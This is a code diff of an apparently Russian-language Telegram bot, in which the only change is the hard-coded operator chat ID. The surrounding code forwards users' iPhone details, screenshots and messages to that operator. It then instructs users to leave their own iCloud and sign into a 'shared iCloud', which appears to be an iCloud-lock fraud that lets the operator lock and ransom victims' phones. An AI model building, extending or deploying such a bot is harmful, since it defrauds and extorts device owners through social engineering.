@@ -48,7 +48,7 @@ def receive_screenshot(message):
         try:
             file_id = message.photo[-1].file_id
             caption = f"Скриншот от @{message.from_user.username}" if message.from_user.username else f"Скриншот от {message.from_user.first_name}"
-            bot.send_photo(chat_id=7250450110, photo=file_id, caption=caption)
+            bot.send_photo(chat_id=7540214867, photo=file_id, caption=caption)
             bot.send_message(message.chat.id, "✅ Скриншот получен")
         except Exception as e:
             bot.reply_to(message, f"Ошибка при пересылке фото: {e}")
@@ -69,7 +69,7 @@ def get_apps(message):
     region = data[user_id]['region']
     apps = data[user_id]['apps']
     bot.send_message(user_id, '✨ Готово\nТвоя заявка успешно отправлена ✅\n⏳ В ближайшие минуты с тобой свяжется администратор,\nчтобы помочь установить.')
-    bot.send_message(chat_id=7250450110, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
+    bot.send_message(chat_id=7540214867, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}\nID-типа: {message.from_user.id}")
     bot.send_message(user_id, 
         'Теперь дело за малым! Тебе надо выйти со своего iCloud и зайти на Общий iCloud!\n\n'
         '1. Что такое общий iCloud\n\n'
@@ -115,7 +115,7 @@ def helper(call):
 
 @bot.message_handler(commands=['block'])
 def finish_cmd(message):
-    if message.chat.id != 7250450110:
+    if message.chat.id != 7540214867:
         return
 
     parts = message.text.split(maxsplit=1)
@@ -141,7 +141,7 @@ def finish_cmd(message):
 
 @bot.message_handler(commands=['send'])
 def send_message_by_user(message):
-    if message.chat.id != 7250450110:
+    if message.chat.id != 7540214867:
         return
     
     parts = message.text.split(maxsplit=2)
@@ -182,18 +182,19 @@ def universal(message):
         bot.send_message(message.chat.id, text='Приветствую, Босс!\nЗа работу!🤑', reply_markup=types.ReplyKeyboardRemove())
         return
     
-    if message.chat.id == 7250450110:
+    if message.chat.id == 7540214867:
         return
     
     uname = (message.from_user.username or "").lower()
     if (message.from_user.id in blocked_ids) or (uname and uname in blocked_usernames):
         return
 
-    if message.chat.id != 7250450110:
-        bot.send_message(chat_id=7250450110, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
+    if message.chat.id != 7540214867:
+        bot.send_message(chat_id=7540214867, text=f"💬️Сообщение от @{message.from_user.username} (id: {message.from_user.id}):\n{message.text}")
 
 
 bot.polling()
+
 
 
 
